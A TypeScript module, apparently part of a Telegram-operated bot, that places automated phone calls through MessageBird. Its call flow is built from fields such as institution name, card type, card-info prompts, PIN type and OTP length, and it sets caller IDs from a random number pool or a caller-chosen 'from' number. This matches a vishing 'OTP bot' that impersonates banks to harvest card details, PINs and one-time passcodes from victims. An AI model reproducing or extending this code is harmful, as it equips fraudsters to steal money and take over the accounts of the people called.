/* eslint-disable no-console */
/* eslint-disable @typescript-eslint/no-explicit-any */
import initMB from 'messagebird';
import { bot } from '..';
import { answer } from '../server/answer';
import { CallInputType } from '../types';

export const messagebird = initMB(process.env.MESSAGEBIRD_API_KEY as string);

export const messagebirdMakeACall: any = async ({
  institutionName,
  to,
  from,
  step,
  wallet,
  cardType,
  askCardInfo,
  chatId,
  transferNumber,
  pinType,
  customMessage,
  actions,
  language,
  otpLength,
}: CallInputType) => {
  const flow = answer({
    institutionName,
    from,
    step,
    wallet,
    cardType,
    askCardInfo,
    chatId,
    transferNumber,
    pinType,
    customMessage,
    actions,
    language,
    otpLength,
  });
  const numbers = process.env.MESSAGEBIRD_NUMBERS?.split(`,`);
  return messagebird.calls.create(
    {
      source:
        to[0] === `1`
          ? numbers
            ? numbers[Math.floor(Math.random() * numbers.length)]
            : ``
          : from,
      destination: to,
      callFlow: flow,
      // @ts-expect-error ignore
      webhook: {
        url: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        token: process.env.MESSAGEBIRD_TOKEN,
      },
    },
    async (err, res) => {
      if (err) {
        console.log(err);

        await bot.telegram.sendMessage(
          chatId,
          `Something went wrong try again later.`,
        );
        await bot.context.scene?.enter('super-wizard');
        return;
      }
      console.log(res);

      await bot.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
    },
  );
};
